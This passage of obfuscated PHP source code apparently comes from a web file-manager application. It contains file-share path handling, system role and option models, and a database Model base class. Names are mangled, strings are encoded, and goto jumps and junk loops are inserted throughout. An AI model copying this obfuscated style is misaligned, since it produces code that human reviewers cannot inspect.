$_SERVER[ÏéâËõ‘]; $À—“ØßÈ = IO::info($this->pathParse[$”ÜİÃ¾Ù[84]]); if (!$À—“ØßÈ) { return array(); } $ëî¬ÂÊÔ = $this->model->listAll($‰Ã¦Š¶); foreach ($ëî¬ÂÊÔ as &$Ñç™¸Æ€) { $Ñç™¸Æ€[$”ÜİÃ¾Ù[86]] = Action($”ÜİÃ¾Ù[1180])->shareItemInfo($Ñç™¸Æ€[$”ÜİÃ¾Ù[86]]); } unset($Ñç™¸Æ€); return $ëî¬ÂÊÔ; } } class PathDriverDriverShareItem { public function __construct($¿À¡‰±¸) { $this->pathParse = $¿À¡‰±¸; } public function __call($ğÜ¤ëÖÌ, $îÙ”æÃ) { $ÆéÈĞª¯ =& $_SERVER[ÏéâËõ‘]; if (method_exists($this, $ğÜ¤ëÖÌ)) { return; } $ˆİ˜éÈÒ = call_user_func_array(array($ÆéÈĞª¯[1342], $ğÜ¤ëÖÌ), $îÙ”æÃ); $ĞÜÆ¡ù = array($ÆéÈĞª¯[1343], $ÆéÈĞª¯[1344], $ÆéÈĞª¯[1345], $ÆéÈĞª¯[1346], $ÆéÈĞª¯[555], $ÆéÈĞª¯[557], $ÆéÈĞª¯[1347], $ÆéÈĞª¯[107], $ÆéÈĞª¯[1348], $ÆéÈĞª¯[1349]); if (in_array($ğÜ¤ëÖÌ, $ĞÜÆ¡ù)) { $ˆİ˜éÈÒ = $this->getPathOuter($ˆİ˜éÈÒ); } return $ˆİ˜éÈÒ; } public function copy($Š‰Àˆù, $ÈÇ±ÏŸº, $ÌŒ£ğÈ¥ = false, $áÛû˜úû = false) { return $this->copyMove($Š‰Àˆù, $ÈÇ±ÏŸº, $ÌŒ£ğÈ¥, $_SERVER[ÏéâËõ‘][555], $áÛû˜úû); } public function move($§ºò§—ï, $Æ€ÏÑò½, $“È¾™ãó = false, $êÑÈ—Æé = false) { return $this->copyMove($§ºò§—ï, $Æ€ÏÑò½, $“È¾™ãó, $_SERVER[ÏéâËõ‘][557], $êÑÈ—Æé); } private function copyMove($œç¬í®, $ƒôê¦Òâ, $Û“Å”Ã­, $ê×®›†, $ŞŸØôÂ = false) { $ü¢ß ßÖ =& $_SERVER[ÏéâËõ‘]; $ÜÓÕ÷Í¹ = $ƒôê¦Òâ; $µ›£­†È = IO::driverMake($ƒôê¦Òâ); if ($µ›£­†È->pathParse[$ü¢ß ßÖ[1156]]) { $ƒôê¦Òâ = $µ›£­†È->pathParse[$ü¢ß ßÖ[1156]]; } else { $ƒôê¦Òâ = $ÜÓÕ÷Í¹; } $ÆíĞüÄÑ = IO::copyMove($œç¬í®, $ƒôê¦Òâ, $Û“Å”Ã­, $ê×®›†, $ŞŸØôÂ); $ÆíĞüÄÑ = $this->getPathOuter($ÆíĞüÄÑ); return $ÆíĞüÄÑ; } public function pathThis($¨ÆÅï´¾) { return get_path_this($this->pathParse[$_SERVER[ÏéâËõ‘][84]]); } public function pathFather($†ÀÏ·é¯) { return get_path_father($this->pathParse[$_SERVER[ÏéâËõ‘][84]]); } public function iconvSystem($£Ä•Ü«ö) { return $£Ä•Ü«ö; } protected function infoParse($ºèµØ¦Ï, $›ê®À = false) { $Ìû£ŸË‹ =& $_SERVER[ÏéâËõ‘]; $´üÄŞ¼Ï = $this->pathParse[$Ìû£ŸË‹[487]][$Ìû£ŸË‹[1181]] . $this->pathParse[$Ìû£ŸË‹[1174]]; if ($›ê®À) { $Ø‚Çî­Á = IO::infoWithChildren($´üÄŞ¼Ï); } else { $Ø‚Çî­Á = IO::info($´üÄŞ¼Ï); } $İÀŒÆšÆ = $this->pathParse[$Ìû£ŸË‹[487]]; return Action($Ìû£ŸË‹[1340])->_shareItemeParse($Ø‚Çî­Á, $İÀŒÆšÆ); } public function listAll($ñ³‰ÙûÊ) { $åú‚ãÂ˜ =& $_SERVER[ÏéâËõ‘]; $ğìœµ‰œ = IO::listAll($ñ³‰ÙûÊ); $ß”„¢ùˆ = $this->pathParse[$åú‚ãÂ˜[487]]; foreach ($ğìœµ‰œ as &$Ôí¸òªü) { check_abort(); $£Ñõ¥«  = IO::info($Ôí¸òªü[$åú‚ãÂ˜[84]]); $£Ñõ¥«  = is_array($£Ñõ¥« ) ? $£Ñõ¥«  : array(); $Ôí¸òªü = array_merge($£Ñõ¥« , $Ôí¸òªü); $Ôí¸òªü[$åú‚ãÂ˜[86]] = Action($åú‚ãÂ˜[1340])->_shareItemeParse($Ôí¸òªü, $ß”„¢ùˆ); } unset($Ôí¸òªü); return $ğìœµ‰œ; } public function getPathOuter($èó×¼Æ) { $¶Âçò’‚ =& $_SERVER[ÏéâËõ‘]; $˜¬‘ÔÓ = KodIO::parse($èó×¼Æ); if ($˜¬‘ÔÓ[$¶Âçò’‚[33]] == KodIO::KOD_SHARE_ITEM) { return $˜¬‘ÔÓ[$¶Âçò’‚[84]]; } $Ø·Ô¼ÏÀ = KodIO::clear($èó×¼Æ); $Ò î³£ = KodIO::clear($this->pathParse[$¶Âçò’‚[487]][$¶Âçò’‚[1181]]); $½ØÛ •ğ = substr($Ø·Ô¼ÏÀ, strlen($Ò î³£)); if (substr($Ø·Ô¼ÏÀ, 0, strlen($Ò î³£)) != $Ò î³£) { return !1; } return $this->pathParse[$¶Âçò’‚[1175]] . $¶Âçò’‚[8] . ltrim($½ØÛ •ğ, $¶Âçò’‚[8]); } public function getType() { $ÊáĞ«Áö =& $_SERVER[ÏéâËõ‘]; $¤Ñí±ğ = str_replace($ÊáĞ«Áö[74], $ÊáĞ«Áö[12], get_class($this)); return strtolower($¤Ñí±ğ); } public function isTypeObject($ÒšÉ‘¬î) { return IO::isTypeObject($ÒšÉ‘¬î); } public function info($–åşêÌº) { return $this->infoParse($–åşêÌº); } public function infoAuth($ùšÂ•˜¼) { return $this->infoParse($ùšÂ•˜¼); } public function infoWithChildren($Æµªô³¡) { return $this->infoParse($Æµªô³¡, !0); } public function infoFull($ƒÎñ›‰ã) { return $this->infoParse($ƒÎñ›‰ã); } } goto AÌùí¼Ú‚¨; cÈ¥­Š‹•: define($_SERVER[ÏéâËõ‘][612], $_SERVER[ÏéâËõ‘][613]); $lgcqfpaoym = $_SERVER[ÏéâËõ‘][614]; while ($lgcqfpaoym < $_SERVER[ÏéâËõ‘][615]) { if ($lgcqfpaoym >= 0) { break; } $lgcqfpaoym++; } goto Eâ»”¨‚°ã; c­ˆÓËÚİ¹: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\145\x6d\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array("\155\145\156\x75", "\162\157\x6c\x65", "\x72\x6f\154\x65\107\162\x6f\165\x70", "\x72\x65\x67\x69\x73\x74", "\x65\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($•ÔÍúë¨) { return "\123\171\x73\164\145\155\117\x70\164\x69\157\x6e\137{$•ÔÍúë¨}"; } protected function optionDefault($¨·Ù©ˆ = '') { $ƒÁ—ŠØ¨ =& $_SERVER[ÏéâËõ‘]; if ($¨·Ù©ˆ == $ƒÁ—ŠØ¨[12]) { return $GLOBALS[$ƒÁ—ŠØ¨[6]][$ƒÁ—ŠØ¨[381]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\162\157\x6c\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x61\x75\x74\150", "\154\x61\142\145\154", "\144\151\163\160\x6c\x61\171", "\x73\171\x73\164\145\155", "\144\x65\163\x63", "\x69\x67\156\157\x72\145\105\x78\x74", "\x69\147\x6e\x6f\162\x65\106\151\x6c\145\x53\x69\172\x65", "\141\144\x6d\x69\156\151\163\164\x72\141\x74\157\162", "\x73\157\x72\x74"); public function listData($ÂËòÛ¿’ = false, $¢«µÒÅø = "\163\x6f\162\164", $˜ã§”ùš = false) { $£øâÑ¤æ =& $_SERVER[ÏéâËõ‘]; $ô¤¾ÌòÀ = parent::listData($ÂËòÛ¿’, $¢«µÒÅø, $˜ã§”ùš); if (!$ÂËòÛ¿’) { foreach ($ô¤¾ÌòÀ as $Œµ ÷ÂÌ => $üû¶Æé) { if ($üû¶Æé[$£øâÑ¤æ[2032]] == 1) { $ô¤¾ÌòÀ[$Œµ ÷ÂÌ][$£øâÑ¤æ[453]] = LNG($£øâÑ¤æ[2266]); } } } return $ô¤¾ÌòÀ; } public function update($ĞåÖşœÎ, $¶Ä† €ñ) { $ˆÚ·¶Ş» =& $_SERVER[ÏéâËõ‘]; $Ùß°ñ‰ø = parent::listData($ĞåÖşœÎ); $ˆºİİå¹ = $this->findByName($¶Ä† €ñ[$ˆÚ·¶Ş»[32]]); if (!$Ùß°ñ‰ø || $ˆºİİå¹ && $ˆºİİå¹[$ˆÚ·¶Ş»[399]] != $Ùß°ñ‰ø[$ˆÚ·¶Ş»[399]]) { return !1; } if ($ˆºİİå¹[$ˆÚ·¶Ş»[2032]] == 1) { $¶Ä† €ñ = array($ˆÚ·¶Ş»[32] => $¶Ä† €ñ[$ˆÚ·¶Ş»[32]], $ˆÚ·¶Ş»[1857] => $¶Ä† €ñ[$ˆÚ·¶Ş»[1857]]); } $this->filterAuth($¶Ä† €ñ[$ˆÚ·¶Ş»[413]]); return parent::update($ĞåÖşœÎ, $¶Ä† €ñ); } public function remove($şÕĞÔ³è) { $„“Ù¥¯Ø = parent::listData($şÕĞÔ³è); if (!$„“Ù¥¯Ø || $„“Ù¥¯Ø[$_SERVER[ÏéâËõ‘][1281]]) { return !1; } return parent::remove($şÕĞÔ³è); } public function add($¬ü¯¦Ïõ) { $˜‘ÁŒ› =& $_SERVER[ÏéâËõ‘]; $¯ÆğĞÙ = $¬ü¯¦Ïõ[$˜‘ÁŒ›[32]]; if ($this->findByName($¯ÆğĞÙ)) { return !1; } $åÅÈÙó† = array($˜‘ÁŒ›[420] => $¯ÆğĞÙ, $˜‘ÁŒ›[1840] => $˜‘ÁŒ›[12], $˜‘ÁŒ›[1836] => $˜‘ÁŒ›[1844], $˜‘ÁŒ›[2267] => 1, $˜‘ÁŒ›[1839] => 0, $˜‘ÁŒ›[2268] => 0, $˜‘ÁŒ›[1838] => $this->getSort()); $¬ü¯¦Ïõ = array_merge($åÅÈÙó†, $¬ü¯¦Ïõ); $this->filterAuth($¬ü¯¦Ïõ[$˜‘ÁŒ›[413]]); return parent::insert($¬ü¯¦Ïõ); } private function getSort() { $ÑÏõï¯Ë =& $_SERVER[ÏéâËõ‘]; $™å÷¡‹” = parent::listData(); $öá«Ÿ“Š = array_to_keyvalue($™å÷¡‹”, $ÑÏõï¯Ë[12], $ÑÏõï¯Ë[1858]); return empty($öá«Ÿ“Š) ? 0 : max($öá«Ÿ“Š) + 1; } private function filterAuth(&$ŞÅ®³éü) { $øôÕ‚û© =& $_SERVER[ÏéâËõ‘]; $Åîª§á¹ = array(); $ºôèØ = array_filter(explode($øôÕ‚û©[50], $ŞÅ®³éü)); foreach ($ºôèØ as $ŞÅ®³éü) { $ÉĞ¡ùÓ = explode($øôÕ‚û©[10], $ŞÅ®³éü); if ($ÉĞ¡ùÓ[0] == $øôÕ‚û©[2269] && $ÉĞ¡ùÓ[1] != $øôÕ‚û©[1200]) { $æÁø¡˜â = $ÉĞ¡ùÓ[0] . $øôÕ‚û©[10] . $ÉĞ¡ùÓ[1] . $øôÕ‚û©[2270]; if (!in_array($æÁø¡˜â, $ºôèØ)) { $Åîª§á¹[] = $æÁø¡˜â; } } $Åîª§á¹[] = $ŞÅ®³éü; } $ŞÅ®³éü = implode($øôÕ‚û©[50], $Åîª§á¹); } public function findRoleDefault() { $±ËËø‹Ç =& $_SERVER[ÏéâËõ‘]; $™áÆÇâ‚ = parent::listData(); $âíÊÄ¥Ì = !1; foreach ($™áÆÇâ‚ as $÷ÜÉì‚Ç) { if (!$÷ÜÉì‚Ç || $÷ÜÉì‚Ç[$±ËËø‹Ç[1856]] == $±ËËø‹Ç[197] || $÷ÜÉì‚Ç[$±ËËø‹Ç[2032]] == 1) { continue; } if (strstr($÷ÜÉì‚Ç[$±ËËø‹Ç[413]], $±ËËø‹Ç[2271])) { continue; } if (!strstr($÷ÜÉì‚Ç[$±ËËø‹Ç[413]], $±ËËø‹Ç[2272])) { continue; } if (!$âíÊÄ¥Ì) { $âíÊÄ¥Ì = $÷ÜÉì‚Ç; continue; } $èø¸“¸¬ = explode($±ËËø‹Ç[50], $âíÊÄ¥Ì[$±ËËø‹Ç[413]]); $ï‚ñÉ¾î = explode($±ËËø‹Ç[50], $÷ÜÉì‚Ç[$±ËËø‹Ç[413]]); if (count($èø¸“¸¬) > count($ï‚ñÉ¾î)) { $âíÊÄ¥Ì = $÷ÜÉì‚Ç; } } return $âíÊÄ¥Ì ? $âíÊÄ¥Ì[$±ËËø‹Ç[399]] : $±ËËø‹Ç[12]; } public function sort($ÛÆªÇĞÒ, $ØéÚ·÷…) { return parent::update($ÛÆªÇĞÒ, $ØéÚ·÷…); } } goto e¨Š§®¦…; f²ã ¦¬Ú: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", "\157\x72\x64\145\x72", "\141\154\151\141\163", "\x68\x61\166\x69\156\147", "\x67\162\x6f\x75\160", "\x6c\x6f\143\153", "\x64\x69\163\x74\151\x6e\143\164", "\141\x75\164\x6f", "\x66\151\154\x74\145\162", "\x76\141\154\151\x64\x61\164\145", "\x72\145\x73\165\154\x74", "\142\151\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($Áèãç‡Ñ = '', $±Ç½‹È¢ = '', $Èºœ¡® = '') { $€ş‚Â· =& $_SERVER[ÏéâËõ‘]; $this->_initialize(); if (!empty($Áèãç‡Ñ)) { if (strpos($Áèãç‡Ñ, $€ş‚Â·[10])) { list($this->dbName, $this->name) = explode($€ş‚Â·[10], $Áèãç‡Ñ); } else { $this->name = $Áèãç‡Ñ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($±Ç½‹È¢)) { $this->tablePrefix = $€ş‚Â·[12]; } elseif ($€ş‚Â·[12] != $±Ç½‹È¢) { $this->tablePrefix = $±Ç½‹È¢; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($€ş‚Â·[244]); } $this->db(0, empty($this->connection) ? $Èºœ¡® : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‹Á˜ÂÏõ =& $_SERVER[ÏéâËõ‘]; if (empty($this->fields)) { if (think_config($‹Á˜ÂÏõ[245])) { $€ÈœÚÖ = $this->dbName ? $this->dbName : think_config($‹Á˜ÂÏõ[246]); $ş•„²Ì¸ = think_var_cache($‹Á˜ÂÏõ[247] . strtolower(get_path_this($€ÈœÚÖ) . $‹Á˜ÂÏõ[10] . $this->name)); if ($ş•„²Ì¸) { $­Ä¸Œ‹Ù = think_config($‹Á˜ÂÏõ[248]); if (empty($­Ä¸Œ‹Ù) || $ş•„²Ì¸[$‹Á˜ÂÏõ[249]] == $­Ä¸Œ‹Ù) { $this->fields = $ş•„²Ì¸; return; } } } $this->flush(); } } public function flush() { $¶ÀĞìêë =& $_SERVER[ÏéâËõ‘]; $this->db->setModel($this->name); $‡î¶³è = $this->db->getFields($this->getTableName()); if (!$‡î¶³è) { return !1; } $this->fields = array_keys($‡î¶³è); $this->fields[$¶ÀĞìêë[250]] = !1; foreach ($‡î¶³è as $îÍò¦í => $èÏ²æó†) { $œşßáç[$îÍò¦í] = $èÏ²æó†[$¶ÀĞìêë[33]]; if ($èÏ²æó†[$¶ÀĞìêë[39]]) { $this->fields[$¶ÀĞìêë[251]] = $îÍò¦í; if ($èÏ²æó†[$¶ÀĞìêë[42]]) { $this->fields[$¶ÀĞìêë[250]] = !0; } } } $this->fields[$¶ÀĞìêë[252]] = $œşßáç; if (think_config($¶ÀĞìêë[248])) { $this->fields[$¶ÀĞìêë[249]] = think_config($¶ÀĞìêë[248]); } if (think_config($¶ÀĞìêë[245])) { $ÊÓÅˆ¶— = $this->dbName ? $this->dbName : think_config($¶ÀĞìêë[246]); think_var_cache($¶ÀĞìêë[247] . strtolower(get_path_this($ÊÓÅˆ¶—) . $¶ÀĞìêë[10] . $this->name), $this->fields); } } public function switchModel($ªœŞãì, $òº³õ–  = array()) { $²ç¦„©å =& $_SERVER[ÏéâËõ‘]; $›ƒ…å£ = ucwords(strtolower($ªœŞãì)) . $²ç¦„©å[253]; if (!class_exists($›ƒ…å£)) { think_exception($›ƒ…å£ . think_lang($²ç¦„©å[254])); } $this->_extModel = new $›ƒ…å£($this->name); if (!empty($òº³õ– )) { foreach ($òº³õ–  as $ııı·Ï) { $this->_extModel->setProperty($ııı·Ï, $this->{$ııı·Ï}); } } return $this->_extModel; } public function __set($Å”©ä«˜, $Ø©æÒã’) { $this->data[$Å”©ä«˜] = $Ø©æÒã’; } public function __get($ß±±•¿Ñ) { return isset($this->data[$ß±±•¿Ñ]) ? $this->data[$ß±±•¿Ñ] : null; } public function __isset($İò‚ÌÈ) { return isset($this->data[$İò‚ÌÈ]); } public function __unset($¢¸ãüÂ) { unset($this->data[$¢¸ãüÂ]); } public function __call($å†«Ãİµ, $’½’‰») { $¢ÊíÎé =& $_SERVER[ÏéâËõ‘]; if (in_array(strtolower($å†«Ãİµ), $this->methods, !0)) { $this->options[strtolower($å†«Ãİµ)] = $’½’‰»[0]; return $this; } elseif (in_array(strtolower($å†«Ãİµ), array($¢ÊíÎé[255], $¢ÊíÎé[256], $¢ÊíÎé[257], $¢ÊíÎé[258], $¢ÊíÎé[259]), !0)) { $ƒ…¯üöÍ = isset($’½’‰»[0]) ? $’½’‰»[0] : $¢ÊíÎé[188]; $ƒ…¯üöÍ = $this->db->parseKey($ƒ…¯üöÍ); return $this->getField(strtoupper($å†«Ãİµ) . $¢ÊíÎé[260] . $ƒ…¯üöÍ . $¢ÊíÎé[261] . $å†«Ãİµ, $¢ÊíÎé[255]); } elseif (strtolower(substr($å†«Ãİµ, 0, 5)) == $¢ÊíÎé[262]) { $ƒ…¯üöÍ = think_parse_name(substr($å†«Ãİµ, 5)); $¯÷‘ÕŠ[$ƒ…¯üöÍ] = $’½’‰»[0]; return $this->where($¯÷‘ÕŠ)->find(); } elseif (strtolower(substr($å†«Ãİµ, 0, 10)) == $¢ÊíÎé[263]) { $¤²Áé„º = think_parse_name(substr($å†«Ãİµ, 10)); $¯÷‘ÕŠ[$¤²Áé„º] = $’½’‰»[0]; return $this->where($¯÷‘ÕŠ)->getField($’½’‰»[1]); } elseif (isset($this->_scope[$å†«Ãİµ])) { return $this->scope($å†«Ãİµ, $’½’‰»[0]); } elseif (method_exists($this, $å†«Ãİµ)) { array_unshift($’½’‰», $å†«Ãİµ); return call_user_func_array(array($this, $¢ÊíÎé[264]), $’½’‰»); } else { return call_user_func_array(array(parent, $å†«Ãİµ), $’½’‰»); } } protected function call() { $åµ³ì‚ =& $_SERVER[ÏéâËõ‘]; $¾ÜÕêÕ• = func_get_args(); $Ò¼¹Ä€ = array_shift($¾ÜÕêÕ•); $œ×Ø½õ = $Ò¼¹Ä€; if (is_array($Ò¼¹Ä€)) { $œ×Ø½õ = $Ò¼¹Ä€[1]; $Ò¼¹Ä€ = $Ò¼¹Ä€[0]; } $ÊŠ¼†éâ = count($¾ÜÕêÕ•) - 1; if (isset($¾ÜÕêÕ•[$ÊŠ¼†éâ]) && $¾ÜÕêÕ•[$ÊŠ¼†éâ] === $Ò¼¹Ä€) { think_exception(__CLASS__ . $åµ³ì‚[4] . $Ò¼¹Ä€ . think_lang($åµ³ì‚[265])); return; } $¾ÜÕêÕ•[] = $Ò¼¹Ä€; if (method_exists($this, $åµ³ì‚[266])) { $í´•’ÌÁ = call_user_func_array(array($this, $åµ³ì‚[267]), array($œ×Ø½õ, $¾ÜÕêÕ•)); if (!is_null($í´•’ÌÁ) && $í´•’ÌÁ !== !1) { return $í´•’ÌÁ; } } $·°·úú» = call_user_func_array(array($this, $Ò¼¹Ä€), $¾ÜÕêÕ•); if (method_exists($this, $åµ³ì‚[268])) { $í´•’ÌÁ = call_user_func_array(array($this, $åµ³ì‚[269]), array($œ×Ø½õ, $¾ÜÕêÕ•, $·°·úú»)); if ($í´•’ÌÁ) { return $í´•’ÌÁ; } } return $·°·úú»; } protected function _initialize() { } protected function _facade($ú¨úŞ¦ã) { $øä©îí =& $_SERVER[ÏéâËõ‘]; if (!empty($this->fields)) { foreach ($ú¨úŞ¦ã as $³Ãœ¨¯ => $ôíŸš‰ñ) { if (is_array($this->fields) && !in_array($³Ãœ¨¯, $this->fields, !0)) { unset($ú¨úŞ¦ã[$³Ãœ¨¯]); } elseif (is_scalar($ôíŸš‰ñ)) { $this->_parseType($ú¨úŞ¦ã, $³Ãœ¨¯); } } } if (!empty($this->options[$øä©îí[270]])) { $ú¨úŞ¦ã = array_map($this->options[$øä©îí[270]], $ú¨úŞ¦ã); unset($this->options[$øä©îí[270]]); } $this->_beforeWrite($ú¨úŞ¦ã); return $ú¨úŞ¦ã; } protected function _beforeWrite(&$Ü¤Ğùêİ) { } public function add($œ€ï´ = '', $“—‚‡ó = array(), $µÏ­ö›ö = false) { if (empty($œ€ï´)) { if (!empty($this->data)) { $œ€ï´ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÏéâËõ‘][271]); return !1; } } $“—‚‡ó = $this->_parseOptions($“—‚‡ó); $œ€ï´ = $this->_facade($œ€ï´); if (!1 === $this->_beforeInsert($œ€ï´, $“—‚‡ó)) { return !1; } $‚ÀÎÆı¿ = $this->db->insert($œ€ï´, $“—‚‡ó, $µÏ­ö›ö); if (!1 !== $‚ÀÎÆı¿) { $Ÿª°Í„÷ = $this->getLastInsID(); if ($Ÿª°Í„÷) { $œ€ï´[$this->getPk()] = $Ÿª°Í„÷; $this->_after_insert($œ€ï´, $“—‚‡ó); return $Ÿª°Í„÷; } $this->_after_insert($œ€ï´, $“—‚‡ó); } return $‚ÀÎÆı¿; } protected function _beforeInsert(&$ÛÏÒòÌ, $Ô§ıµŒ¡) { } protected function _after_insert($‡öŒÔÄñ, $¢ø˜î»ı) { } public function addAll($ø£û¦¸©, $ò¼Ö¤¨ = array(), $ÏüÛ€Û¬ = false) { $ÂçöÒû =& $_SERVER[ÏéâËõ‘]; if (empty($ø£û¦¸©)) { $this->error = think_lang($ÂçöÒû[271]); return !1; } $ò¼Ö¤¨ = $this->_parseOptions($ò¼Ö¤¨); foreach ($ø£û¦¸© as $Ê‰ÄÉïÜ => $Ê¶Í×´) { $ø£û¦¸©[$Ê‰ÄÉïÜ] = $this->_facade($Ê¶Í×´); } if (method_exists($this->db, $ÂçöÒû[272])) { $‹¯¥´Œº = $this->db->insertAll($ø£û¦¸©, $ò¼Ö¤¨, $ÏüÛ€Û¬); } else { $this->startTrans(); foreach ($ø£û¦¸© as $Ê‰ÄÉïÜ => $Ê¶Í×´) { $‹¯¥´Œº = $this->db->insert($Ê¶Í×´, $ò¼Ö¤¨, $ÏüÛ€Û¬); } $this->commit(); } if (!1 !== $‹¯¥´Œº) { $›•Ö„Ô’ = $this->getLastInsID(); if ($›•Ö„Ô’) { return $›•Ö„Ô’; } } return $‹¯¥´Œº; } public function selectAdd($Û»¦å”ü = '', $ãÕˆã©« = '', $´˜¼¯½™ = array()) { $¨àƒŒõï =& $_SERVER[ÏéâËõ‘]; $´˜¼¯½™ = $this->_parseOptions($´˜¼¯½™); if (!1 === ($¾ñŒß = $this->db->selectInsert($Û»¦å”ü ? $Û»¦å”ü : $´˜¼¯½™[$¨àƒŒõï[273]], $ãÕˆã©« ? $ãÕˆã©« : $this->getTableName(), $´˜¼¯½™))) { $this->error = think_lang($¨àƒŒõï[274]); return !1; } else { return $¾ñŒß; } } public function save($ÉÑëêêÊ = '', $”ãñÁ¿É = array()) { $ĞØşõÌÔ =& $_SERVER[ÏéâËõ‘]; if (empty($ÉÑëêêÊ)) { if (!empty($this->data)) { $ÉÑëêêÊ = $this->data; $this->data = array(); } else { $this->error = think_lang($ĞØşõÌÔ[271]); return !1; } } $ÉÑëêêÊ = $this->_facade($ÉÑëêêÊ); $”ãñÁ¿É = $this->_parseOptions($”ãñÁ¿É); $É¥ûÖ§Ú = $this->getPk(); if (!isset($”ãñÁ¿É[$ĞØşõÌÔ[275]])) { if (isset($ÉÑëêêÊ[$É¥ûÖ§Ú])) { $ğÛÆººô[$É¥ûÖ§Ú] = $ÉÑëêêÊ[$É¥ûÖ§Ú]; $”ãñÁ¿É[$ĞØşõÌÔ[275]] = $ğÛÆººô; unset($ÉÑëêêÊ[$É¥ûÖ§Ú]); } else { $this->error = think_lang($ĞØşõÌÔ[274]); return !1; } } if (is_array($”ãñÁ¿É[$ĞØşõÌÔ[275]]) && isset($”ãñÁ¿É[$ĞØşõÌÔ[275]][$É¥ûÖ§Ú])) { $·ü±Ù… = $”ãñÁ¿É[$ĞØşõÌÔ[275]][$É¥ûÖ§Ú]; } if (!1 === $this->_beforeUpdate($ÉÑëêêÊ, $”ãñÁ¿É)) { return !1; } $·¢²‹¢µ = $this->db->update($ÉÑëêêÊ, $”ãñÁ¿É); if (!1 !== $·¢²‹¢µ) { if (isset($·ü±Ù…)) { $ÉÑëêêÊ[$É¥ûÖ§Ú] = $·ü±Ù…; } $this->_afterUpdate($ÉÑëêêÊ, $”ãñÁ¿É); } return $·¢²‹¢µ; } protected function _beforeUpdate(&$×Ìçƒ•¹, $ÏªŸòşš) { } protected function _afterUpdate($‹æ¢è„Ñ, $Šù†Î”¯) { } public function delete($ê³ÁÌÚ = array()) { $¬©Çª”Ã =& $_SERVER[ÏéâËõ‘]; if (empty($ê³ÁÌÚ) && empty($this->options[$¬©Çª”Ã[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ò£²ÓœÃ = $this->getPk(); if (is_numeric($ê³ÁÌÚ) || is_string($ê³ÁÌÚ)) { if (strpos($ê³ÁÌÚ, $¬©Çª”Ã[50])) { $ŸÛÕ¡Ë[$ò£²ÓœÃ] = array($¬©Çª”Ã[276], $ê³ÁÌÚ); } else { $ŸÛÕ¡Ë[$ò£²ÓœÃ] = $ê³ÁÌÚ; } $this->options[$¬©Çª”Ã[275]] = $ŸÛÕ¡Ë; } $ê³ÁÌÚ = $this->_parseOptions(); if (is_array($ê³ÁÌÚ[$¬©Çª”Ã[275]]) && isset($ê³ÁÌÚ[$¬©Çª”Ã[275]][$ò£²ÓœÃ])) { $æİÚÄ• = $ê³ÁÌÚ[$¬©Çª”Ã[275]][$ò£²ÓœÃ]; } $À–ÕÉ = $this->db->delete($ê³ÁÌÚ); if (!1 !== $À–ÕÉ) { $äŒŠŸõ” = array(); if (isset($æİÚÄ•)) { $äŒŠŸõ”[$ò£²ÓœÃ] = $æİÚÄ•; } $this->_after_delete($äŒŠŸõ”, $ê³ÁÌÚ); } return $À–ÕÉ; } protected function _after_delete($ÅŸØ¾Ş§, $èô½Ş±—) { } public function select($¹Ë Ö´í = array()) { $³¶ÍüÒ¤ =& $_SERVER[ÏéâËõ‘]; if (is_string($¹Ë Ö´í) || is_numeric($¹Ë Ö´í)) { $Ô„†“ñ˜ = $this->getPk(); if (strpos($¹Ë Ö´í, $³¶ÍüÒ¤[50])) { $¦‚‘”ì£[$Ô„†“ñ˜] = array($³¶ÍüÒ¤[276], $¹Ë Ö´í); } else { $¦‚‘”ì£[$Ô„†“ñ˜] = $¹Ë Ö´í; } $this->options[$³¶ÍüÒ¤[275]] = $¦‚‘”ì£; } elseif (!1 === $¹Ë Ö´í) { $¹Ë Ö´í = $this->_parseOptions(); return $³¶ÍüÒ¤[277] . $this->db->buildSelectSql($¹Ë Ö´í) . $³¶ÍüÒ¤[278]; } $¹Ë Ö´í = $this->_parseOptions(); $İìİ œÄ = $this->db->select($¹Ë Ö´í); if (!1 === $İìİ œÄ) { return !1; } if (empty($İìİ œÄ)) { return null; } $this->_afterSelect($İìİ œÄ, $¹Ë Ö´í); return $İìİ œÄ; } protected function _afterSelect(&$Öó»â“, $§î›„) { } public function buildSql($ˆÓÒ• = array()) { $„«ı†šé =& $_SERVER[ÏéâËõ‘]; $ˆÓÒ• = $this->_parseOptions($ˆÓÒ•); return $„«ı†šé[277] . $this->db->buildSelectSql($ˆÓÒ•) . $„«ı†šé[278]; } public function optionsValue($Ò¼É¸âë = null) { if (is_null($Ò¼É¸âë)) { return $this->options; } elseif (is_array($Ò¼É¸âë)) { $this->options = array_merge($this->options, $Ò¼É¸âë); } } protected function _parseOptions($ï´‚­É´ = array()) { $ŠëªŞ²Å =& $_SERVER[ÏéâËõ‘]; if (is_array($ï´‚­É´)) { $ï´‚­É´ = array_merge($this->options, $ï´‚­É´); } $this->options = array(); if (!isset($ï´‚­É´[$ŠëªŞ²Å[279]])) { $ï´‚­É´[$ŠëªŞ²Å[279]] = $this->getTableName(); $˜úÔ¡ÈÁ = $this->fields; } else { $˜úÔ¡ÈÁ = $this->getDbFields(); } if (!empty($ï´‚­É´[$ŠëªŞ²Å[280]])) { $ï´‚­É´[$ŠëªŞ²Å[279]] .= $ŠëªŞ²Å[53] . $ï´‚­É´[$ŠëªŞ²Å[280]]; } $ï´‚­É´[$ŠëªŞ²Å[281]] = $this->name; if (isset($ï´‚­É´[$ŠëªŞ²Å[275]]) && is_array($ï´‚­É´[$ŠëªŞ²Å[275]]) && 